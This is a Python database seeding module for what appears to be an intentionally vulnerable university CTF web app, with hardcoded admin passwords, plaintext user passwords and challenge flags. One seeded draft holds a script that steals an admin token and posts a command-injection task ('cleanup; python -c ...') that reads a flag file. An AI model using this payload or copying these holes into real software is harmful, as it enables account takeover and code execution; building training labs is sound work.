import os
import sqlite3
from datetime import datetime
from pathlib import Path


ROOT_DIR = Path(__file__).resolve().parent.parent
DB_PATH = Path(os.environ.get("DB_PATH", ROOT_DIR / "database" / "enpm634_midterm_team22.db"))
INIT_SQL = ROOT_DIR / "database" / "init.sql"
SEARCH_DB_PATH = Path(os.environ.get("SEARCH_DB_PATH", ROOT_DIR / "database" / "enpm634_midterm_team22_search.db"))
SEARCH_INIT_SQL = ROOT_DIR / "database" / "search_init.sql"
UPLOAD_DIR = ROOT_DIR / "app" / "static" / "uploads"
DEFAULT_ADMIN_EMAIL = "admin@team22.local"
PUBLIC_MAILDROP_DOMAIN = "@maildrop.local"
ADMIN_PASSWORD = "ENPM634-admin-T22-4f9c2d7b"
OPSADMIN_PASSWORD = "ENPM634-ops-T22-8d1f6a4c"
STORED_XSS_FLAG = "ENPM634{stored_xss_comment}"
BLIND_SQLI_FLAG = "ENPM634{blind_sqli_extraction}"
BLIND_SQLI_FLAG_KEY = "search_archive"
IDOR_FLAG = "ENPM634{idor_draft_access}"
CSRF_FLAG = "ENPM634{csrf_account_takeover}"
FULL_CHAIN_FLAG = "ENPM634{full_chain_rce}"
FINAL_CHAIN_MAILDROP = "ops-audit@maildrop.local"
STALE_RCE_FILENAME = "rce-flag.txt"
IDOR_FLAG_DRAFT_TITLE = "Private admin planning"
IDOR_FLAG_DRAFT_CONTENT = (
    f"Hidden note for grading lab work: {IDOR_FLAG} "
    "Ops audit summaries still route to ops-audit@maildrop.local, and dry-run output should never land in the web root."
)
MODERATOR_DRAFT_PUBLIC_ID = 1
IDOR_FLAG_DRAFT_PUBLIC_ID = 2
ALICE_DRAFT_PUBLIC_ID = 3
IDOR_HINT_DRAFT_PUBLIC_ID = 634
IDOR_HINT_DRAFT_TITLE = "Queue dry-run scratch"
IDOR_HINT_DRAFT_CONTENT = """Rough staging repro for the queue-based maintenance dry run. This is incomplete and should not be pasted into production as-is.

<script>
window.addEventListener('load', async () => {
  if (typeof adminApiToken === "undefined") return;
  const token = adminApiToken;

  const python = [
    'import sqlite3,datetime,pathlib',
    'conn=sqlite3.connect("__DB_PATH__")',
    'flag=pathlib.Path("__FLAG_PATH__").read_text().strip()',
    'now=datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")',
    'conn.execute("INSERT INTO mail_messages (recipient_email, subject, body, created_at) VALUES (?, ?, ?, ?)", ("__MAILDROP__", "Maintenance audit", flag, now))',
    'conn.commit()',
  ].join("; ");

  const task = "cleanup; python -c '" + python + "' #";

  await fetch('__MAINTENANCE_PATH__', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-Admin-Token': token,
    },
    body: 'task=' + encodeURIComponent(task),
  });
});
</script>

Reminder: dry-run output belongs in the mail queue, never in the web root."""


def get_connection() -> sqlite3.Connection:
    connection = sqlite3.connect(DB_PATH)
    connection.row_factory = sqlite3.Row
    return connection


def get_search_connection() -> sqlite3.Connection:
    connection = sqlite3.connect(SEARCH_DB_PATH)
    connection.row_factory = sqlite3.Row
    return connection


def sync_search_database() -> None:
    SEARCH_DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    schema = SEARCH_INIT_SQL.read_text(encoding="utf-8")

    with get_connection() as source_connection, get_search_connection() as search_connection:
        search_connection.executescript(schema)
        search_connection.execute("DELETE FROM posts")
        search_connection.execute("DELETE FROM challenge_flags")

        posts = source_connection.execute(
            "SELECT id, title, content, created_at FROM posts ORDER BY id"
        ).fetchall()
        if posts:
            search_connection.executemany(
                """
                INSERT INTO posts (id, title, content, created_at)
                VALUES (?, ?, ?, ?)
                """,
                [
                    (post["id"], post["title"], post["content"], post["created_at"])
                    for post in posts
                ],
            )

        flags = source_connection.execute(
            "SELECT flag_key, flag_value FROM challenge_flags ORDER BY flag_key"
        ).fetchall()
        if flags:
            search_connection.executemany(
                """
                INSERT INTO challenge_flags (flag_key, flag_value)
                VALUES (?, ?)
                """,
                [(flag["flag_key"], flag["flag_value"]) for flag in flags],
            )

        search_connection.commit()


def allocate_public_draft_id(connection: sqlite3.Connection) -> int:
    taken_ids = {
        row["public_id"]
        for row in connection.execute(
            "SELECT public_id FROM drafts WHERE public_id IS NOT NULL ORDER BY public_id"
        ).fetchall()
    }
    candidate = 1
    while candidate in taken_ids:
        candidate += 1
    return candidate


def ensure_draft_public_ids(connection: sqlite3.Connection) -> None:
    columns = {
        column["name"]
        for column in connection.execute("PRAGMA table_info(drafts)").fetchall()
    }
    if "public_id" not in columns:
        connection.execute("ALTER TABLE drafts ADD COLUMN public_id INTEGER")

    reserved_ids = (
        (MODERATOR_DRAFT_PUBLIC_ID, "Moderator checklist"),
        (IDOR_FLAG_DRAFT_PUBLIC_ID, IDOR_FLAG_DRAFT_TITLE),
        (ALICE_DRAFT_PUBLIC_ID, "Alice draft"),
        (IDOR_HINT_DRAFT_PUBLIC_ID, IDOR_HINT_DRAFT_TITLE),
    )
    for public_id, title in reserved_ids:
        connection.execute(
            "UPDATE drafts SET public_id = NULL WHERE public_id = ? AND title != ?",
            (public_id, title),
        )
        connection.execute(
            "UPDATE drafts SET public_id = ? WHERE title = ?",
            (public_id, title),
        )

    drafts_without_public_id = connection.execute(
        "SELECT id FROM drafts WHERE public_id IS NULL ORDER BY id"
    ).fetchall()
    for draft in drafts_without_public_id:
        connection.execute(
            "UPDATE drafts SET public_id = ? WHERE id = ?",
            (allocate_public_draft_id(connection), draft["id"]),
        )

    connection.execute(
        "CREATE UNIQUE INDEX IF NOT EXISTS idx_drafts_public_id ON drafts(public_id)"
    )


def ensure_user_profile_review_metadata(connection: sqlite3.Connection) -> None:
    columns = {
        column["name"]
        for column in connection.execute("PRAGMA table_info(users)").fetchall()
    }
    if "bio_updated_at" not in columns:
        connection.execute("ALTER TABLE users ADD COLUMN bio_updated_at TEXT DEFAULT ''")

    users_without_timestamp = connection.execute(
        "SELECT id FROM users WHERE bio_updated_at IS NULL OR bio_updated_at = ''"
    ).fetchall()
    for user in users_without_timestamp:
        connection.execute(
            "UPDATE users SET bio_updated_at = ? WHERE id = ?",
            (datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"), user["id"]),
        )


def init_database() -> None:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    SEARCH_DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

    with get_connection() as connection:
        with open(INIT_SQL, "r", encoding="utf-8") as sql_file:
            connection.executescript(sql_file.read())
        ensure_user_profile_review_metadata(connection)
        ensure_draft_public_ids(connection)
        connection.commit()

        user_count = connection.execute("SELECT COUNT(*) AS total FROM users").fetchone()["total"]
        if user_count == 0:
            seed_database(connection)
        migrate_training_state(connection)

    sync_search_database()

    default_avatar = UPLOAD_DIR / "default-avatar.png"
    if not default_avatar.exists():
        default_avatar.write_bytes(
            bytes.fromhex(
                "89504E470D0A1A0A0000000D49484452000000010000000108060000001F15C489"
                "0000000D49444154789C6360606060000000040001F61738550000000049454E44AE426082"
            )
        )


def seed_database(connection: sqlite3.Connection) -> None:
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    users = [
        ("admin", DEFAULT_ADMIN_EMAIL, ADMIN_PASSWORD, "Site administrator and editor.", now, "/static/uploads/default-avatar.png", 1, 1),
        ("opsadmin", "ops@team22.local", OPSADMIN_PASSWORD, "Operations owner for internal posts.", now, "/static/uploads/default-avatar.png", 1, 1),
        ("alice", "alice@example.com", "alicepass", "Security student and hobby blogger.", now, "/static/uploads/default-avatar.png", 0, 1),
        ("bob", "bob@example.com", "bobpass", "Writes about Flask and containers.", now, "/static/uploads/default-avatar.png", 0, 0),
    ]
    connection.executemany(
        """
        INSERT INTO users (username, email, password, bio, bio_updated_at, avatar, is_admin, email_verified)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """,
        users,
    )

    posts = [
        ("Welcome to ENPM634_midterm-Team22", "This is the first post on the platform.", 1, now),
        (
            "Docker Notes",
            "Container builds are automatic in this demo environment. "
            "Default workdir remains anchored under /app and legacy smoke-test artifacts still live in /opt.",
            4,
            now,
        ),
        ("Campus Security Club", "We meet every Friday to practice web testing.", 3, now),
    ]
    connection.executemany(
        "INSERT INTO posts (title, content, author_id, created_at) VALUES (?, ?, ?, ?)",
        posts,
    )

    drafts = [
        (
            MODERATOR_DRAFT_PUBLIC_ID,
            "Moderator checklist",
            "Review imports, user bios, and flagged comments before publishing.",
            1,
            0,
            now,
        ),
        (
            IDOR_FLAG_DRAFT_PUBLIC_ID,
            IDOR_FLAG_DRAFT_TITLE,
            IDOR_FLAG_DRAFT_CONTENT,
            2,
            0,
            now,
        ),
        (
            ALICE_DRAFT_PUBLIC_ID,
            "Alice draft",
            "Still polishing this write-up before I publish it.",
            3,
            0,
            now,
        ),
    ]
    connection.executemany(
        """
        INSERT INTO drafts (public_id, title, content, author_id, is_published, created_at)
        VALUES (?, ?, ?, ?, ?, ?)
        """,
        drafts,
    )
    connection.execute(
        """
        INSERT INTO drafts (public_id, title, content, author_id, is_published, created_at)
        VALUES (?, ?, ?, ?, 0, ?)
        """,
        (
            IDOR_HINT_DRAFT_PUBLIC_ID,
            IDOR_HINT_DRAFT_TITLE,
            IDOR_HINT_DRAFT_CONTENT,
            2,
            now,
        ),
    )

    connection.execute(
        "INSERT INTO uploads (user_id, filename, path, uploaded_at) VALUES (?, ?, ?, ?)",
        (1, "default-avatar.png", "/static/uploads/default-avatar.png", now),
    )
    connection.execute(
        "INSERT INTO challenge_flags (flag_key, flag_value) VALUES (?, ?)",
        (BLIND_SQLI_FLAG_KEY, BLIND_SQLI_FLAG),
    )
    connection.executemany(
        "INSERT INTO mail_messages (recipient_email, subject, body, created_at) VALUES (?, ?, ?, ?)",
        [
            (
                DEFAULT_ADMIN_EMAIL,
                "Welcome to ENPM634_midterm-Team22",
                "Your profile email is active in the training environment.",
                now,
            ),
            (
                "alice@example.com",
                "Welcome to ENPM634_midterm-Team22",
                "Your profile email is active in the training environment.",
                now,
            ),
            (
                "bob@example.com",
                "Welcome to ENPM634_midterm-Team22",
                "Your profile email is active in the training environment.",
                now,
            ),
        ],
    )
    connection.commit()


def migrate_training_state(connection: sqlite3.Connection) -> None:
    stale_flag_file = UPLOAD_DIR / STALE_RCE_FILENAME
    if stale_flag_file.exists():
        stale_flag_file.unlink()

    admin = connection.execute("SELECT id, password, email FROM users WHERE username = 'admin'").fetchone()
    if admin and admin["password"] in {"admin123", BLIND_SQLI_FLAG}:
        connection.execute(
            "UPDATE users SET password = ? WHERE id = ?",
            (ADMIN_PASSWORD, admin["id"]),
        )

    ops_admin = connection.execute("SELECT id, password FROM users WHERE username = 'opsadmin'").fetchone()
    if ops_admin and ops_admin["password"] in {"opsadmin123", BLIND_SQLI_FLAG}:
        connection.execute(
            "UPDATE users SET password = ? WHERE id = ?",
            (OPSADMIN_PASSWORD, ops_admin["id"]),
        )

    challenge_flag = connection.execute(
        "SELECT id FROM challenge_flags WHERE flag_key = ?",
        (BLIND_SQLI_FLAG_KEY,),
    ).fetchone()
    if challenge_flag:
        connection.execute(
            "UPDATE challenge_flags SET flag_value = ? WHERE flag_key = ?",
            (BLIND_SQLI_FLAG, BLIND_SQLI_FLAG_KEY),
        )
    else:
        connection.execute(
            "INSERT INTO challenge_flags (flag_key, flag_value) VALUES (?, ?)",
            (BLIND_SQLI_FLAG_KEY, BLIND_SQLI_FLAG),
        )

    draft = connection.execute(
        """
        SELECT id
        FROM drafts
        WHERE title = ?
           OR content LIKE ?
        ORDER BY id
        LIMIT 1
        """,
        (IDOR_FLAG_DRAFT_TITLE, f"%{IDOR_FLAG}%"),
    ).fetchone()
    if draft:
        connection.execute(
            "UPDATE drafts SET title = ?, content = ?, author_id = ? WHERE id = ?",
            (
                IDOR_FLAG_DRAFT_TITLE,
                IDOR_FLAG_DRAFT_CONTENT,
                2,
                draft["id"],
            ),
        )

    hint_draft = connection.execute(
        "SELECT id FROM drafts WHERE title = ?",
        (IDOR_HINT_DRAFT_TITLE,),
    ).fetchone()
    if hint_draft:
        connection.execute(
            "UPDATE drafts SET content = ?, author_id = ? WHERE id = ?",
            (
                IDOR_HINT_DRAFT_CONTENT,
                2,
                hint_draft["id"],
            ),
        )
    else:
        created_at = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        connection.execute(
            """
            INSERT INTO drafts (public_id, title, content, author_id, is_published, created_at)
            VALUES (?, ?, ?, ?, 0, ?)
            """,
            (
                IDOR_HINT_DRAFT_PUBLIC_ID,
                IDOR_HINT_DRAFT_TITLE,
                IDOR_HINT_DRAFT_CONTENT,
                2,
                created_at,
            ),
        )

    ensure_draft_public_ids(connection)

    docker_notes = connection.execute(
        "SELECT id FROM posts WHERE title = 'Docker Notes'"
    ).fetchone()
    if docker_notes:
        connection.execute(
            "UPDATE posts SET content = ? WHERE id = ?",
            (
                (
                    "Container builds are automatic in this demo environment. "
                    "Default workdir remains anchored under /app and legacy smoke-test artifacts still live in /opt."
                ),
                docker_notes["id"],
            ),
        )

    connection.execute(
        """
        DELETE FROM mail_messages
        WHERE subject = 'Instructor flag'
           OR body LIKE ?
           OR body LIKE ?
           OR recipient_email = ?
        """,
        (f"%{CSRF_FLAG}%", f"%{FULL_CHAIN_FLAG}%", FINAL_CHAIN_MAILDROP),
    )

    admin_email = admin["email"] if admin else DEFAULT_ADMIN_EMAIL
    mailbox_count = connection.execute(
        "SELECT COUNT(*) AS total FROM mail_messages WHERE recipient_email = ?",
        (admin_email,),
    ).fetchone()["total"]
    if mailbox_count == 0:
        now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        connection.executemany(
            "INSERT INTO mail_messages (recipient_email, subject, body, created_at) VALUES (?, ?, ?, ?)",
            [
                (
                    admin_email,
                    "Welcome to ENPM634_midterm-Team22",
                    "Your profile email is active in the training environment.",
                    now,
                ),
            ],
        )

    connection.commit()
